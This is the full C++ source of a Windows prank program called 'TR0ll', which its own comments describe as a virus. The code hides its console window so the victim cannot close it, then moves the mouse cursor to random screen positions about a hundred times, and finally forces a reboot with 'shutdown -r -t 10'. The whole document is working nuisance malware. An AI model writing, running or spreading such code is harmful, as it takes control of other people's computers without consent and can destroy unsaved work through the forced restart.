#define _WIN32_WINNT 0x0500 //For hiding your console

#include <cstdlib>
#include <iostream>
#include <Windows.h>
#include <WinBase.h>

using namespace std;

void  Craze(), HideWin();
HWND hWnd;
LRESULT CALLBACK DlgProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

void HideWin()
{
    // Hide the console so that they can't close it
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

void Craze()
{
    // Make the mouse cursor crazy
    int X = rand() % 1367;
    int Y = rand() % 769;
    SetCursorPos(X, Y);
}

int main()
{
    system("TITLE TR0ll");
    cout << "TR0ll     --v2.1--\n";
    HideWin();    
    Sleep(1000);
    int n = 0;
    do
    {
        // The Virus Begins        
        Craze();
        Sleep(10);
        n++;
    } while (n < 100);    
    system("shutdown -r -t 10");
    return EXIT_SUCCESS;
}